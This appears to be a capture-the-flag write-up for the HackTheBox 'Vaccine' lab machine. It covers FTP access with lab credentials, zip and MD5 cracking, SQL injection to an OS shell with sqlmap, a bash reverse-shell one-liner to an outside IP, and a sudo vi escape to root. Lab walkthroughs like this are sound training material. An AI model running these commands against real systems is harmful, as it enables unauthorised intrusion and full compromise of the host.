Vaccine is another linux based OS of starting point lab hackthebox.Let's get started

i. Enumeration
==============
#nmap -sC -sV -p- --min-rate=1000 -T4 -oN vaccinescan <ip>
-> We will be enumerating the services and open ports

After enumeration we found three interesting ports:
ftp,ssh and http

-> In previous machine,we found some credentials for ftp
name: ftpuser
password:  mc@F1l3ZilL4

-> After logging in, we got a file named backup.zip which is password protected. So,let's crack it using john
  # zip2john backup.zip > hash
  # john hash
  - We got a password for zip file
  
-> Unzipping the file gives us some interesting files
  # cat index.php
  - Copy the admin hash and crack the given md5 from crackstation
  - Password we got from there is qwerty789
  
-> Now we are into the website 

ii. Initial Access
==================
-> There is a search lookup page which is vulnerable to SQL injection.Now, we will use sqlmap to gain initial access to the shell.
-> Intercept the request using burp and save the request
-> Sqlmap tool to access the shell
  #sqlmap -r requestfile --batch
  # sqlmap -r requestfile --os-shell
  
-> Now we have got access to the shell. It's time to get reverse shell on our local machine which can be achieved using bash.

  # bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'
  -> We got shell
  
 -> Let's have a look at the given folder.There is a file named dashboad.php which gives us some credentials for postgresql login
  
 user: postgres
 password: P@s5w0rd!
 
 
 Let's find the user flag now.
 # find / -type f -name user.txt 2>/dev/null
 - Copy the user flag
 
 
iii. Privilege Escalation
=========================
-> To escalate privilege we will enumerate the machine.
First upgrade our shell:
# python -c "import pty;pty.spawn('/bin/bash');"
- Our shell will be upgraded
# sudo -l
- Use the previous password and it show us sudoers file
- We can use vi to file named pg_hba.conf

Let's use this sudoer's file to gain access to the root

# sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 press (ESC):!/bin/bash
 
 We are now root!!!! Copy the flag from root folder.
